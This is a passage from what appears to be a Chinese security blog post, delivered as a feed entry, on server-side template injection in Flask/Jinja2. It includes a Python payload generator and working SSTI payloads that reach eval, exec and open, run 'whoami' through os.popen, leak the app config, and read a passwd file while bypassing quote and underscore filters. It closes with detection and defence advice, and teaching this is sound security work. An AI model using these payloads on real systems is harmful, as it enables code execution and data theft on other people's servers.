%&#125;</span><br></pre></td></tr></table></figure><p>针对Python3有个脚本会自动帮我们生成需要的控制结构形式的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># python 3.5</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># Some of special names</span></span><br><span class="line">searchList = [<span class="string">'__init__'</span>, <span class="string">"__new__"</span>, <span class="string">'__del__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__str__'</span>, <span class="string">'__bytes__'</span>, <span class="string">'__format__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__le__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__bool__'</span>, <span class="string">'__getattr__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__get__'</span>, <span class="string">'__set__'</span>, <span class="string">'__delete__'</span>, <span class="string">'__call__'</span>, <span class="string">"__instancecheck__"</span>, <span class="string">'__subclasscheck__'</span>, <span class="string">'__len__'</span>, <span class="string">'__length_hint__'</span>, <span class="string">'__missing__'</span>,<span class="string">'__getitem__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__iter__'</span>,<span class="string">'__delitem__'</span>, <span class="string">'__reversed__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__add__'</span>, <span class="string">'__sub__'</span>,<span class="string">'__mul__'</span>]</span><br><span class="line">neededFunction = [<span class="string">'eval'</span>, <span class="string">'open'</span>, <span class="string">'exec'</span>]</span><br><span class="line">pay = int(input(<span class="string">"Payload?[1|0]"</span>))</span><br><span class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">        <span class="keyword">if</span> hasattr(i, attr):</span><br><span class="line">            <span class="keyword">if</span> eval(<span class="string">'str(i.'</span>+attr+<span class="string">')[1:9]'</span>) == <span class="string">'function'</span>:</span><br><span class="line">                <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                    <span class="keyword">if</span> (eval(<span class="string">'"'</span>+goal+<span class="string">'" in i.'</span>+attr+<span class="string">'.__globals__["__builtins__"].keys()'</span>)):</span><br><span class="line">                        <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                            print(i.__name__,<span class="string">":"</span>, attr, goal)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            print(<span class="string">"&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='"</span> + i.__name__ + <span class="string">"' %&#125;&#123;&#123; c."</span> + attr + <span class="string">".__globals__['__builtins__']."</span> + goal + <span class="string">"(\"[evil]\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;"</span>)</span><br></pre></td></tr></table></figure><p>本地Python2运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payload?[1|0]1</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Decimal'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Decimal'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Template'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'Template'</span> %&#125;&#123;&#123; c.__new__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">"[evil]"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>测试一下也是OK的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Decimal&apos; %&#125;&#123;&#123; c.__new__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/18.png" alt=""></p><p>具体在Python3的表现可自行测试。</p><h2 id="0x05-结合Flask和Jinja2特性的沙箱逃逸技巧"><a href="#0x05-结合Flask和Jinja2特性的沙箱逃逸技巧" class="headerlink" title="0x05 结合Flask和Jinja2特性的沙箱逃逸技巧"></a>0x05 结合Flask和Jinja2特性的沙箱逃逸技巧</h2><p>这里只补充<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>中没提到的关于Flask和Jinja2结合的一些沙箱逃逸技巧。</p><h3 id="无法直接获取全局变量config"><a href="#无法直接获取全局变量config" class="headerlink" title="无法直接获取全局变量config"></a>无法直接获取全局变量config</h3><p>通过current_app的payload来替换config获取配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=e:/passwd</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/16.png" alt=""></p><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h3><p>同样是利用Flask的request.args属性来绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;E:/passwd&apos;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/17.png" alt=""></p><p>当然，也可以将其中的request.args改为request.values，利用post的方式进行传参：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login?name=&#123;&#123;&apos;&apos;[request.values.class][request.values.mro][2][request.values.subclasses]()[40](&apos;E:/passwd&apos;).read()&#125;&#125; HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><h2 id="0x06-检测与防御"><a href="#0x06-检测与防御" class="headerlink" title="0x06 检测与防御"></a>0x06 检测与防御</h2><p><strong>检测方法</strong></p><p>在Flask工程中全局搜索是否有使用render_template_string()函数，若存在则进一步判断该函数的第一个参数的值获取需要渲染的内容的输入形式，若为变量取值语句的形式则不存在SSTI漏洞，若为%s传入需渲染的内容的形式则存在SSTI漏洞。</p><p><strong>防御方法</strong></p><ul><li>尽量使用render_template()函数而非render_template_string()函数；</li><li>使用render_template_string()函数时，传入需渲染的内容参数时必须采用变量取值语句的形式，禁止使用%s的传参形式进行传参；</li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html" target="_blank" rel="noopener">浅析SSTI(python沙盒绕过)</a></p><p><a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">python-flask-ssti(模版注入漏洞)</a></p><p><a href="https://98587329.github.io/2018/06/06/python-沙箱逃逸/" target="_blank" rel="noopener">python 沙箱逃逸</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/tags/Python/"/>
    
      <category term="SSTI" scheme="https://Mi1k7ea.github.com/tags/SSTI/"/>
    
  </entry>
  
</feed>
